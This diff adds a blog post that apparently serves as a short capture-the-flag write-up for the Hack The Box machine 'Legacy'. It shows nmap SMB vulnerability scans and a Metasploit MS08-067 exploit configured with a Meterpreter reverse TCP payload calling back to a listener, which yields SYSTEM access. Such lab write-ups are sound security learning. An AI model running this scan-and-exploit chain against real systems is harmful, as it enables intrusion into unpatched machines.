@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Legacy - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Legacy</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1731413184215"
+                  >2024-11-12 13:06</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1731415729353"
+                  >2024-11-12 13:48</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code><span class="hljs-string">nmap</span> <span class="hljs-string">-p-</span> <span class="hljs-string">-A</span> <span class="hljs-number">10.129</span><span class="hljs-number">.175</span><span class="hljs-number">.13</span>
+<span class="hljs-string">PORT</span>    <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>      <span class="hljs-string">VERSION</span>
+<span class="hljs-number">135</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">139</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span>
+<span class="hljs-number">445</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">Windows</span> <span class="hljs-string">XP</span> <span class="hljs-string">microsoft-ds</span>
+<span class="hljs-attr">Service Info: OSs:</span> <span class="hljs-string">Windows,</span> <span class="hljs-string">Windows</span> <span class="hljs-string">XP;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows,</span> <span class="hljs-string">cpe:/o:microsoft:windows_xp</span>
+
+<span class="hljs-attr">Host script results:</span>
+<span class="hljs-string">|_nbstat:</span> <span class="hljs-attr">NetBIOS name:</span> <span class="hljs-string">nil,</span> <span class="hljs-attr">NetBIOS user:</span> <span class="hljs-string">&lt;unknown&gt;,</span> <span class="hljs-attr">NetBIOS MAC:</span> <span class="hljs-number">00</span><span class="hljs-string">:50:56:94:24:83</span> <span class="hljs-string">(VMware)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">guest</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span>
+<span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">disabled</span> <span class="hljs-string">(dangerous,</span> <span class="hljs-string">but</span> <span class="hljs-string">default)</span>
+<span class="hljs-string">|_smb2-time:</span> <span class="hljs-string">Protocol</span> <span class="hljs-string">negotiation</span> <span class="hljs-string">failed</span> <span class="hljs-string">(SMB2)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">XP</span> <span class="hljs-string">(Windows</span> <span class="hljs-number">2000 </span><span class="hljs-string">LAN</span> <span class="hljs-string">Manager)</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">OS CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows_xp::-</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">legacy</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">LEGACY\x00</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">Workgroup:</span> <span class="hljs-string">HTB\x00</span>
+<span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2024-11-17T16:03:14+02:00</span>
+<span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">5d00h57m37s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">1h24m50s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">4d23h57m37s</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">445</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.175</span><span class="hljs-selector-class">.13</span> <span class="hljs-selector-tag">--script</span> <span class="hljs-selector-tag">smb-vuln</span>*
+<span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-selector-tag">7</span><span class="hljs-selector-class">.94SVN</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-11-12 12:12 UTC</span>
+Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">175.13</span>
+Host is up (<span class="hljs-number">0.048s</span> latency).
+
+PORT    STATE SERVICE      VERSION
+<span class="hljs-number">445</span>/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Windows XP; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">microsoft</span>:windows_xp
+
+Host script <span class="hljs-attribute">results</span>:
+|<span class="hljs-attribute">_smb-vuln-ms10-061</span>: <span class="hljs-attribute">ERROR</span>: Script execution failed (use -d to debug)
+| <span class="hljs-attribute">smb-vuln-ms08-067</span>: 
+|   <span class="hljs-attribute">VULNERABLE</span>:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-<span class="hljs-number">067</span>)
+|     <span class="hljs-attribute">State</span>: VULNERABLE
+|     <span class="hljs-attribute">IDs</span>:  <span class="hljs-attribute">CVE</span>:CVE-<span class="hljs-number">2008</span>-<span class="hljs-number">4250</span>
+|           The Server service in Microsoft Windows <span class="hljs-number">2000</span> SP4, XP SP2 and SP3, Server <span class="hljs-number">2003</span> SP1 and SP2,
+|           Vista Gold and SP1, Server <span class="hljs-number">2008</span>, and <span class="hljs-number">7</span> Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure <span class="hljs-attribute">date</span>: <span class="hljs-number">2008</span>-<span class="hljs-number">10</span>-<span class="hljs-number">23</span>
+|     <span class="hljs-attribute">References</span>:
+|       <span class="hljs-attribute">https</span>:<span class="hljs-comment">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span>
+|_      <span class="hljs-attribute">https</span>:<span class="hljs-comment">//technet.microsoft.com/en-us/library/security/ms08-067.aspx</span>
+|<span class="hljs-attribute">_smb-vuln-ms10-054</span>: false
+| <span class="hljs-attribute">smb-vuln-ms17-010</span>: 
+|   <span class="hljs-attribute">VULNERABLE</span>:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-<span class="hljs-number">010</span>)
+|     <span class="hljs-attribute">State</span>: VULNERABLE
+|     <span class="hljs-attribute">IDs</span>:  <span class="hljs-attribute">CVE</span>:CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">0143</span>
+|     Risk <span class="hljs-attribute">factor</span>: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-<span class="hljs-number">010</span>).
+|           
+|     Disclosure <span class="hljs-attribute">date</span>: <span class="hljs-number">2017</span>-<span class="hljs-number">03</span>-<span class="hljs-number">14</span>
+|     <span class="hljs-attribute">References</span>:
+|       <span class="hljs-attribute">https</span>:<span class="hljs-comment">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span>
+|       <span class="hljs-attribute">https</span>:<span class="hljs-comment">//blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span>
+|_      <span class="hljs-attribute">https</span>:<span class="hljs-comment">//technet.microsoft.com/en-us/library/security/ms17-010.aspx</span></code></pre></div>
+<h1 id="ms08-067">MS08-067</h1>
+<p>It’s an easy box and an exploit rated 10, so we can abuse this using metasploit.</p>
+<div><pre class="hljs"><code>[msf](Jobs:<span class="hljs-number">0</span> Agents:<span class="hljs-number">0</span>) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="hljs-keyword">options</span>
+
+Module <span class="hljs-keyword">options</span> (exploit/windows/smb/ms08_067_netapi):
+
+   <span class="hljs-type">Name</span>     <span class="hljs-keyword">Current</span> Setting  Required  Description
+   <span class="hljs-comment">----     ---------------  --------  -----------</span>
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/<span class="hljs-keyword">using</span>-metasploit/basics/<span class="hljs-keyword">using</span>-metasploit.html
+   RPORT    <span class="hljs-number">445</span>              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe <span class="hljs-type">name</span> <span class="hljs-keyword">to</span> use (BROWSER, SRVSVC)
+
+
+Payload <span class="hljs-keyword">options</span> (windows/meterpreter/reverse_tcp):
+
+   <span class="hljs-type">Name</span>      <span class="hljs-keyword">Current</span> Setting  Required  Description
+   <span class="hljs-comment">----      ---------------  --------  -----------</span>
+   EXITFUNC  thread           yes       <span class="hljs-keyword">Exit</span> technique (Accepted: <span class="hljs-string">''</span>, seh, thread, process, <span class="hljs-keyword">none</span>)
+   LHOST     <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.15</span>        yes       The <span class="hljs-keyword">listen</span> address (an interface may be specified)
+   LPORT     <span class="hljs-number">4444</span>             yes       The <span class="hljs-keyword">listen</span> port</code></pre></div>
+<p>We are in and logged in as <code>NT AUTHORITY/SYSTEM</code> and we can grab user flag and root flag.</p>
+<p><img src="/_resources/c734d024500b409d8e810e2b5464eeea.png" /></p>
+<p><img src="/_resources/204163d4bd984b949ae8dccb6ade7761.png" /></p>
+<p>Boring, easy box.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
